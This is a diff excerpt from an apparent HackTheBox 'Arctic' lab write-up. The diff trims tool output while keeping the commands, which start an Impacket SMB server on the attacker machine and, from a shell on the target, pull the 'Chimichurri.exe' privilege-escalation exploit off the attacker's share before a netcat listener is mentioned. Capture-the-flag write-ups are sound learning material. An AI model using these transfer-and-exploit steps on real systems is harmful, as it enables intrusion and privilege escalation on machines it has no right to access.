@@ -292,24 +292,14 @@ Let's open a smb server to share the exploit downloaded.
 ```bash
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
 └─# python3 /opt/impacket/examples/smbserver.py share .
-Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
-
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
 ```
 
 Then, we copy the exploit over to our user shell.
 
 ```powershell
 C:\ColdFusion8\runtime\bin>net use \\10.10.14.4\share
-The command completed successfully.
 
 C:\ColdFusion8\runtime\bin>copy \\10.10.14.4\share\Chimichurri.exe
-        1 file(s) copied.
 ```
 
 Now that we have our exploit ready, let's start another netcat listener and run the exploit!
